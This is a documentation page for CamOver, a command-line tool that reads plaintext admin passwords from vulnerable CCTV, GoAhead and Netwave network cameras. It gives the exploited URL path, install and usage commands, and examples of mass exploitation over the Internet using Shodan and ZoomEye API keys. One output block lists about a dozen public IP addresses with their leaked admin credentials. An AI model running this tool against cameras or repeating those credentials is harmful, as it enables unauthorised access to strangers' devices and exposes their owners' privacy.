---
title : "CamOver"
# pre : ' '
description : "CamOver is a camera exploitation tool that allows to disclosure network camera admin password."
date : 2021-07-06T11:40:36+02:00
# hidden : true
# draft : true
weight : 240
# tags : ['']
---

---

Is a camera exploitation tool that allows to disclosure network camera admin password.

**Features:**

- Exploits vulnerabilities in most popular camera models such as CCTV, GoAhead and Netwave.
- Optimized to exploit multiple cameras at one time from list with threading enabled.
- Simple CLI and API usage.

Tool effectively looks for `http://{address}/system.ini?loginuse&loginpas` and reads the `username:password` plaintext from the `system.ini` file.

## Installation

```plain
python3 -m pip install git+https://github.com/EntySec/CamOver
```

## Usage

```plain
camover [-h] [-t] [-o OUTPUT] [-i INPUT] [-a ADDRESS] [--shodan SHODAN] [--zoomeye ZOOMEYE] [-p PAGES]
```

## Flags

```plain
CamOver is a camera exploitation tool that allows to disclosure network camera admin password.

optional arguments:
  -h, --help            show this help message and exit
  -t, --threads         Use threads for fastest work.
  -o OUTPUT, --output OUTPUT
                        Output result to file.
  -i INPUT, --input INPUT
                        Input file of addresses.
  -a ADDRESS, --address ADDRESS
                        Single address.
  --shodan SHODAN       Shodan API key for exploiting devices over Internet.
  --zoomeye ZOOMEYE     ZoomEye API key for exploiting devices over Internet.
  -p PAGES, --pages PAGES
                        Number of pages you want to get from ZoomEye.
```

## Examples

### Exploiting single camera

Let's hack my camera just for fun.

```plain
camover -a 192.168.99.100
```

### Exploiting cameras from Internet

Let's try to use Shodan search engine to exploit cameras over Internet, we will use it with `-t` for fast exploitation.

```plain
camover -t --shodan [API-KEY]
```

```plain
$ camover -t --shodan [REDACTED]
[*] Authorizing Shodan by given API key...
[+] Authorization successfully completed!
[+] (84.99.151.248:81) - admin:SFR_2E98
[+] (37.116.187.4:81) - admin:Bebbo000
[+] (42.118.152.148:80) - admin:admin
[+] (37.108.23.82:99) - admin:Misiek22!
[+] (59.29.194.241:81) - admin:core7772
[+] (212.127.221.137:80) - admin:quercus2403
[+] (118.71.30.128:80) - admin:admin
[+] (201.188.20.77:80) - admin:216828103
[+] (86.41.122.211:88) - admin:IPCAM
[+] (187.155.117.123:80) - admin:123456
[+] (151.63.22.212:81) - admin:242893
[+] (200.126.178.171:81) - admin:888888
```

### Exploiting cameras from input file

Let's try to use opened database of cameras with -t for fast exploitation.

```plain
camover -t -i cameras.txt -o passwords.txt
```

NOTE: It will exploit all cameras in `cameras.txt` list by their addresses and save all obtained passwords to `passwords.txt`.

## URL List

- [Github.com - CamOver](https://github.com/EntySec/CamOver)
